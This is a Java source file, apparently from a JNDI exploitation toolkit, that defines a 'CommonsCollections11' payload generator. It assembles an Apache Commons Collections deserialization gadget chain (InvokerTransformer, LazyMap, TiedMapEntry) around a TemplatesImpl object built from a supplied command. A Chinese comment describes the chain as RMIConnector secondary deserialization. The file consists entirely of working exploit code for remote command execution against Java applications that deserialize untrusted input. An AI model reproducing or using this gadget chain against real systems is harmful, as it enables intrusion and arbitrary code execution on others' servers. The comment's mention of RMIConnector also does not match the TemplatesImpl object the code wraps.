package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;



/**
 * RMIConnector 二次反序列化
 * 需要调用其 connect 方法，因此需要调用任意方法的 Gadget，这里选择了 InvokerTransformer
 * 直接传入 Base64 编码的序列化数据即可
 */
public class CommonsCollections11 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer      invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap<Object, Object> map                = new HashMap<>();
        Map<Object, Object>     lazyMap            = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);
        HashMap<Object, Object> expMap             = new HashMap<>();
        expMap.put(tiedMapEntry, "QI4L");
        lazyMap.remove(templates);

        Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

        return expMap;
    }
}
